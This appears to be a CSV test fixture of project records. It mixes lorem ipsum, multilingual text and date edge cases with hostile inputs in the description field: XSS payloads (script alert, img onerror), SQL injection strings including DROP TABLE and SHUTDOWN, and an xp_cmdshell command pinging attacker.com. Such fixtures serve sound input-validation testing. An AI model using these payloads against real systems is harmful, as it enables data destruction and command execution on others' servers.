key,title,key-words,description,kick-off-moment,close-out-moment,draft-mode,key:manager
project-33,example,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor*",2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-34,example,example,โลเร็ม อิปซัม,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-35,example,example,لوريم إيبسوم,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-36,example,example,洛伦·伊普森,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-37,example,example,<marquee>Hacked</marquee>,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-38,example,example,<script>alert(‘Hacked!’);</script>,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-39,example,example,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-40,example,example,' or 'A' = 'A' or 'A' = 'A,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-41,example,example,'; DROP TABLE user_account;--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-42,example,example,'; SHUTDOWN;--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-43,example,example,'; EXEC xp_cmdshell('ping attacker.com');--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
# moments,"","","","","","",""
project-44,example,example,example,2025/01/01 00:012025/01/01 00:01,2026/01/01 00:01,true,manager-01
project-45,example,example,example,2200/12/31 23:58,2200/12/31 23:59,true,manager-01
# draft-mode,"","","","","","",""
project-46,example,example,example,2025/09/01 10:00,2025/09/01 12:00,false,manager-01
